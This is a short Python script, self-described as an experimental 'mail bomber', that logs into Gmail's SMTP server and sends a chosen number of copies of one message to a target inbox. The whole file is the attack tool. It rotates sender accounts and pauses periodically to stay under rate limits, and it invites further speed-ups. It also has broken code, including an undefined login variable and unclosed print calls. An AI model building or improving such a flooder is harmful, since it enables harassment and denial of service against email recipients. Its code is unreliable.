#!/usr/bin/python3

# /!\ This is by no means a done work. It's experimental code, that can be built upon to create your own mail bomber. I am not responsible for any damage that could be done with this code.
# Easy win improvement to implement: use threading

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from multiprocessing import Pool, TimeoutError
import time

#sender = input("Send from: ")
senders = ["example@gmail.com","example2@gmail.com"] # Fill in one or multiple email addresses that you want to use as sender - script works with GMail.
#password = input("Password: ")
password = "" # Set your password - needs to be the same for the different sender addresses
receivers = ["receiver@gmail.com"] # Recipient email

try:
	smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
	smtpserver.ehlo()
	smtpserver.starttls()
	smtpserver.ehlo()
	smtpserver.login(sender, password)
	print("SMTP connection successful!")
except Exception as e:
	print(e.message)

def send_email(number_sends,subject):
	mailIndex=0
	i=0
	while i < number_sends:
		if (i%11==0 and mailIndex==0):
			mailIndex=1
			print("----Changing sender email, now sending from: " + senders[mailIndex]
		elif (i%11==0 and mailIndex==1):
			mailIndex=0
			print("----Changing sender email, now sending from: " + senders[mailIndex]
		
		if (i!=0 and i%55==0):
			print("We have to pause before the connection times out. Back in 3 minutes.")
			time.sleep(60*3)
			i+=1
		else:
			message = MIMEMultipart()
			message['Subject'] = subject + " " + str(i+1)
			message['From'] = senders[mailIndex]
			message['To'] = receivers[0]
			fp = open("email",'r')
			message.attach(MIMEText(fp.read()))
			fp.close()
			for target in receivers:
				target="<"+target+">"
				print(target)
				try:
					smtpserver.sendmail(senders[mailIndex],target,message.as_string())
					print("Email %d/[%d] sent!" % (i+1,number_sends))
				except Exception as e:
					print(e.message)
			i+=1

	smtpserver.quit()

number_sends = int(input("How many emails do you want to send? "))
subject = input('Email object: ')

send_email(number_sends,subject)
